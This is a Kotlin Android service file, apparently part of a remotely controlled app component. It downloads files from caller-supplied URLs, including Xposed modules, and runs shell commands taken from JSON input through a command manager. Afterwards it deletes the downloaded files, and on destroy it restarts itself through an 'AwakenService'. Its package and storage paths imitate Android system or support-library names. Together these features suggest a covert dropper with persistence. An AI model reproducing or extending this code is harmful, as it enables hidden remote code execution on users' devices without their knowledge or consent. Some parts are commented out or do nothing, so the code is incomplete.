package android.mf.application.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import org.json.JSONException
import android.R.attr.start
import android.app.DownloadManager
import java.nio.file.Files.delete
import java.nio.file.Files.exists
import org.json.JSONObject
import org.json.JSONArray
import android.mf.application.util.CommandManager
import android.mf.application.util.Logcat
import android.os.Handler
import android.os.Message
import java.io.File
import java.lang.reflect.Field
import java.net.MalformedURLException

class HttpFileService : Service() {
    private val TAG = "HttpFileService"
    private var Key: String? = null
    private var Content: String? = null
    private var isKey = false
    private var isContent = false
    private var downloadHttpUrl: String? = null
    private var downloadSavePath = "/data/data/android.support.library/files/"
    private var downloadFileName: String? = null
    private var downloadFilePath: ArrayList<String>? = null
    private var cmd: ArrayList<String>? = null
    private var cmds: ArrayList<Any>? = null
    private var CMDMr: CommandManager? = null
    private var Task = 0
    private var XPFileNmae:String? = null
    override fun onCreate() {
        super.onCreate()
        downloadFilePath = ArrayList()
        cmds = ArrayList()
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        Key = intent.getStringExtra("Key")
        Content = intent.getStringExtra("Content")
        when (Key) {
            "XposedDownload" -> {
                val arguments = JSONObject(Content)
                val downloadManager = android.mf.application.util.DownloadManager(this)
                downloadManager.setFileHttpUrl(arguments.getString("FileHttpUrl"))
                Logcat.i(TAG,arguments.getString("FileHttpUrl"))
                downloadManager.setSavePath(arguments.getString("SavePath"))
                val SavePath = File(arguments.getString("SavePath"))
                if (!SavePath.exists()) {
                    SavePath.mkdir()
                }
                Logcat.i(TAG,arguments.getString("SavePath"))
                XPFileNmae = arguments.getString("FileNmae")
                Logcat.i(TAG,arguments.getString("FileNmae"))
                downloadManager.setFileNmae(XPFileNmae)
                downloadManager.setThreadNumber(3)
                downloadManager.setMessageHandler(XposedHandler)
                val downloadFile = File(arguments.getString("SavePath") + "/" +XPFileNmae)
                if (downloadFile.exists()) {
                    downloadFile.delete()
                }
                downloadManager.start()

            }
            "download" -> {
                if (cmd != null) {
                    cmds!!.add(cmd!!)
                }
                httpFileOperate(Content)
            }
            "operate" -> {
                Task = Task + intent.getIntExtra("Task", 1)
                CMDMr = CommandManager(this)
                for (i in 0 until Task) {
                    if (CMDMr!!.executeCommand(cmds!![i] as ArrayList<String>)) {
                        cmds!!.remove(i)
                        val downloadFile = File(downloadFilePath!![i])
                        var deleteStatus = true
                        while (deleteStatus) {
                            if (downloadFile.exists()) {
                                if (downloadFile.delete()) {
                                    downloadFilePath!!.removeAt(i)
                                    Task = Task - 1
                                }
                            } else {
                                if (Task == 0) {
                                    this.stopSelf()
                                }
                                deleteStatus = false
                            }
                        }
                    }
                }
            }
        }
        return super.onStartCommand(intent, flags, startId)
    }


    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onDestroy() {
        val intentService = Intent(this, AwakenService::class.java)
        intentService.putExtra("Key", "Destroy")
        intentService.putExtra("Content", "FileService")
        this.startService(intentService)
        super.onDestroy()
    }

    private fun httpFileOperate(c: String?) {
        cmd = ArrayList()
        try {
            val CONTENT = JSONArray(c)
            val arguments = CONTENT.getJSONObject(0)
            downloadHttpUrl = arguments.getString("HttpURL")
            downloadSavePath = this.cacheDir.absolutePath + "/"
            downloadFileName = arguments.getString("FileName")
            val downloadFile = File(downloadSavePath + downloadFileName!!)
            val operate = CONTENT.getJSONObject(1)
            val operateCMD = JSONArray(operate.getString("operate"))
            for (i in 0 until operateCMD.length()) {
                val jsonObject = operateCMD.getJSONObject(i)
                cmd!!.add(jsonObject.getString("cmd"))
            }
            if (downloadFile.exists()) {
                downloadFile.delete()
            }
            /* val downloadManager = DownloadManager(this@FileService)
             downloadManager.startDownload(arrayOf<String>(downloadHttpUrl, downloadSavePath, downloadFileName), 3)
             downloadManager.start()
             downloadFilePath!!.add(downloadSavePath + downloadFileName!!)*/
        } catch (e: JSONException) {
            Logcat.e(TAG, e.printStackTrace())
        } catch (e: MalformedURLException) {
            Logcat.e(TAG, e.printStackTrace())
        }

    }

    private val XposedHandler = object : Handler() {
        override fun handleMessage(msg: Message) {
            when(msg.arg1) {
                0->{
                    XposedDownload("文件下载失败！")
                    Logcat.e(TAG,"文件下载失败！")
                }
                1->{
                    XposedDownload(msg.obj.toString()+"文件下载完成！")
                    Logcat.e(TAG,msg.obj.toString()+"文件下载完成！")
                }
            }
            //Logcat.i(TAG,msg.arg2)
            super.handleMessage(msg)
        }
    }

    fun XposedDownload(msg: String): String {
        return "Download Done"
    }

}